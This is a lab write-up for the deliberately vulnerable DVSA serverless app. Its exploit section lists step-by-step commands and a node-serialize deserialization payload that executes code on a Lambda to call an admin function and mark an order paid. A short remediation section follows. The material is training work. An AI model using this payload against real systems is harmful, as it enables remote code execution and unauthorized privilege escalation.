# Broken Access Control Vulnerability 
The Broken Access Control vulnerability happens because the system fails to check if a user has the right permissions before performing an action. While the system knows who the user is, it doesn't verify their role. This allows a regular user to bypass the payment process and manually change an order status to paid by accessing a hidden administrative link. Essentially, the system mistakenly trusts any logged-in user to perform sensitive tasks that should be reserved for admins.


---
## Vulnerability Exploting
To achieve this vulnerability, we will use the Terminal, DevTools, AWS console, and Notepad. You have to following these steps:

1. Open the DVSA website
2. Right-click and choose the Inspect option, then go to the network tap
3. Add any item to the cart
4. Open the chart and click CHECKOUT
5. In the Network tap, you will find a packet called “order” that has a payload section
6. In the header, you will find the API endpoint in the URL
7. Scroll down to authorization and copy its content (it is your token)
8.	Write this command [$env:AUTH_TOKEN = "paste your token"] in your terminal and change the value with your token that get from the previous steps in part 3. 
9.	Write these commands to get your username value.
````
$tokenPayload = $env:AUTH_TOKEN.Split('.')[1]; 
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($tokenPayload.PadRight($tokenPayload.Length + (4 - $tokenPayload.Length % 4) % 4, '='))) | ConvertFrom-Json | Select-Object -ExpandProperty username
````
10.  Create a new order by writing this command in the terminal: 
````
curl.exe --% -X POST "https://stqdfu0w5m.execute-api.us-east-1.amazonaws.com/dvsa/order" -H "Authorization: %AUTH_TOKEN%" -H "Content-Type: application/json" -d "{\"action\": \"new\", \"cart-id\": \"123\", \"items\": {\"1012\": 1}}"
````

You should get the order-id after running the command. 
11.  Open Notepad and add this:
````
{"action": "_$$ND_FUNC$$_function(){ const { LambdaClient, InvokeCommand } = require('@aws-sdk/client-lambda'); const client = new LambdaClient({ region: 'us-east-1' }); const payload = JSON.stringify({ headers: { authorization: 'add your token' }, body: { action: 'update', 'order-id': 'add your order-id', user: 'add your username', item: { status: 120, total: 7, address: 'XXX', token: 'akrgahu739nc5', ts: 1777062251, itemList: { '1012': 1 } } } }); const command = new InvokeCommand({ FunctionName: 'DVSA-ADMIN-UPDATE-ORDERS', Payload: Buffer.from(payload) }); client.send(command).then(d => console.log('Hacked'), e => console.error(e)); }()"}
````
Replace the authorization value with your token and the order-id with what you get in step 3, and the user value that you gained in step 2.
12.  Save the Notepad file in the same folder as your terminal by clicking the file tab, save as, and add this for the folder name “exploit.json”.
13. Post the file to the system by writing this command:
``````
curl.exe --% -X POST "https://stqdfu0w5m.execute-api.us-east-1.amazonaws.com/dvsa/order" -H "Authorization: %AUTH_TOKEN%" -H "Content-Type: application/json" -d @exploit.json
``````
You will get {"status":"err","msg":"unknown action"} message.



---
## Vulnerability Fixing

The fix of this vulnerability is done in the Order_Manage Lambda function by doing the following:
1.	Commenting the import line for the node-serialize library.
2.	Change the way of treating inputs from unserialize to JSON.pars().
3.	Moving the action declaration to the top to use it for user authorization.
4.	Change isAdmin assignment in the loop to be a boolean.
5.	Add a list of functions that only the admin can access.
6.	Create an if condition to check if the action is only for admins and return an error if the user is not an admin.
7.	Create an if condition to check if the action is complete and return an error if the user is not an admin.

Your code should be similar to the image below
